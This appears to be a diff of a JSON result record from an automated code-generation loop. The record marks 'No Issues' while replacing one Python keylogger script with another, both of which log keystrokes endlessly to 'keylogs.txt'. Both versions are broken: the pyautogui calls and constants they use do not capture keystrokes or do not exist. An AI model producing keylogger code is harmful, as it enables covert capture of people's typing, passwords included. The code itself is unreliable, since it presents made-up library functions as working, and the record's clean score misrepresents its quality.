@@ -7,7 +7,7 @@
   },
   "completed_iterations": 1,
   "stop_reason": "No Issues",
-  "final_score": 6,
+  "final_score": 5,
   "final_issue_count": 0,
-  "code": "import pyautogui\n\n# Specify the filename for the keylog file\nfilename = 'keylogs.txt'\n\n# Open the file for appending\nwith open(filename, 'a') as f:\n    \n    # Loop indefinitely to capture keystrokes\n    while True:\n        \n        # Get the pressed key\n        key = pyautogui.press()\n\n        # Write the key to the log file\n        f.write(key)\n\n        # Print the pressed key to the console\n        print(key)"
+  "code": "import pyautogui\n\nwith open('keylogs.txt', 'w') as f:\n    while True:\n        key = pyautogui.keyStroke()\n        if key.isprintable():\n            f.write(key)\n        elif key == pyautogui.KEY_RETURN:\n            f.write('[ENTER]')\n        elif key == pyautogui.KEY_BACKSPACE:\n            f.write('[BACKSPACE]')\n\n        print(key)"
 }
